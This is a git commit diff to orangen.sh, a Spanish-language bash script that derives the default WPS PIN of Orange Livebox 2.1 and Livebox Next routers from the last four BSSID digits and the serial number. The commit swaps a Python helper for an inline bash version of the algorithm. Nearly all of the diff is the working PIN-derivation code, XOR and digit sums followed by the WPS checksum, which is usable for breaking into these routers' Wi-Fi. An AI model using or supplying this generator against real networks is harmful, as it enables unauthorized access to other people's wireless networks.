3c5eaf22fe26a7654cbee9a1d98858f177c1c83d
kcdtv <kcdtv78@gmail.com>
2017-09-02 14:05:15 +0200

    Update orangen.sh
    algorithm is in bash (again) instead of python (for educational purpose, not for efficiency)

--- orangen.sh
+++ orangen.sh
@@ -1,4 +1,5 @@
 #! /bin/bash
+version=1.1
 # orangen.sh: Default pin generator for livebox 2.1 and livebox next
 # Algorithm and vulnerability by wifi-libre. For more details check https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
@@ -10,21 +11,40 @@
 # Global variables:
 grey="\033[0;37m"
 orange="\033[38;5;202m"
+white="\033[1;37m"
+echo -e "
+$orange  orangen$white.sh$grey: A simple bash PIN generator for$orange livebox 2.1$grey and$white Lievbox Next$grey
 
-ls orangen.sh  || { echo -e "ERROR: Para ejecutar el script debes situar tu terminal en la carpeta nmk y el script orangen.py debe estar presente en la carpeta nmk"; exit 1; }
-until  [[ "$(echo $bssid | tr A-F a-f | egrep -o '^[0-9a-f]{6}' | wc -c)" == 7 ]];
+--------------------------------------------------------------------------------
+"
+
+
+until  [[ "$(echo $bssid | tr A-F a-f | egrep -o '^[0-9a-f]{4}' | wc -c)" == 5 ]];
   do
-   read -n 8 -ep  "Entra la segunda mitad del bssid: " mac
-   bssid=$( echo $mac | tr -d ':' )
+   echo -e "▐█ Entra los$white 4 últimos digítos$grey del$white bSSID$grey (sin los :) $orange"
+   read -n 4 -ep "    " bssid
+   echo -e "$grey"  
 done
-ssid=$( echo $bssid | cut -c 3-)
-wan=$(printf "%X\n" $(( 0x$(echo $ssid) - 2 )))
+wan=$(printf "%X\n" $(( 0x$(echo $bssid) - 2 )))
 until  [[ "$(echo $serial | egrep -o '^[0-9]{4}' | wc -c)" == 5 ]];
   do
-   read -n 4 -ep  "Entra los 4 últimos digítos del número de serie: " seri
-   serial=$( echo $seri | rev | cut -c -4 | rev )
+   echo -e  "▐█ Entra los$white 4 últimos digítos$grey del$white número de serie$orange"
+   read -n 4 -ep "    " serial
+   echo -e "$grey"  
 done
-echo -e "PIN por defecto > $orange"
-python orangen.py $wan $serial
+K1=$(printf "%X\n" $(( 0x$(echo $serial | cut -c 2) + 0x$(echo $serial | cut -c 1)  + 0x$(echo $wan | cut -c 4) + 0x$(echo $wan | cut -c 3) )) | rev | cut -c 1)
+K2=$(printf "%X\n" $(( 0x$(echo $serial | cut -c 4) + 0x$(echo $serial | cut -c 3)  + 0x$(echo $wan | cut -c 2) + 0x$(echo $wan | cut -c 1) )) | rev | cut -c 1)
+D1=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 4))) | cut -c 3)
+D2=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 3))) | cut -c 3) 
+D3=$(printf '0x%X\n' $(( 0x$K2 ^ 0x$(echo $wan | cut -c 2))) | cut -c 3)
+D4=$(printf '0x%X\n' $(( 0x$K2 ^ 0x$(echo $wan | cut -c 3))) | cut -c 3) 
+D5=$(printf '0x%X\n' $(( 0x$(echo $serial | cut -c 4) ^ 0x$(echo $wan | cut -c 3))) | cut -c 3)
+D6=$(printf '0x%X\n' $(( 0x$(echo $serial | cut -c 3) ^ 0x$(echo $wan | cut -c 4))) | cut -c 3)
+D7=$(printf '0x%X\n' $(( 0x$K1 ^ 0x$(echo $serial | cut -c 2))) | cut -c 3)
+conversion=$(printf '%d\n' 0x$D1$D2$D3$D4$D5$D6$D7)
+string=$(printf '%07d\n' $((conversion%10000000)))
+accum=$(($(echo "$string" | cut -c 1) * 3 + $(echo "$string" | cut -c 2) + $(echo "$string" | cut -c 3) * 3 + $(echo "$string" | cut -c 4) + $(echo "$string" | cut -c 5) * 3 + $(echo "$string" | cut -c 6) + $(echo "$string" | cut -c 7) * 3))
+checksum=$((((10 - $((accum%10))))%10))
+echo -e " $white     PIN por defecto: $orange $string$checksum"
 echo -e "$grey
 Copyleft (C) 2017 kcdtv @ www.wifi-libre.com"
